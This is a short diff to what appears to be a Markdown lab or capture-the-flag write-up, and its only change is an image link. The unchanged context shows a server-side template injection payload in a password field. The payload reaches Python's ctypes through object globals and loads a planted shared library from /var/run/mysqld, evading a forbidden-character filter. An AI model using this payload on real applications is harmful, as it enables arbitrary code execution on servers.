@@ -382,4 +382,4 @@ username : admin
 password : {{a.__class__.__init__.__globals__[ctypes].cdll[{a.FORBIDDEN_CHARACTERS[7]}var{a.FORBIDDEN_CHARACTERS[7]}run{a.FORBIDDEN_CHARACTERS[7]}mysqld{a.FORBIDDEN_CHARACTERS[7]}hello123.so]}}{{a}}{a}
 ```
 
-![[Attachments/Pasted image 20261119132130.png]]![Pasted image 20261119115746](Attachments/Pasted%20image%2020261119115746.png)
+![Pasted image 20261119132130](Attachments/Pasted%20image%2020261119132130.png)![Pasted image 20261119115746](Attachments/Pasted%20image%2020261119115746.png)
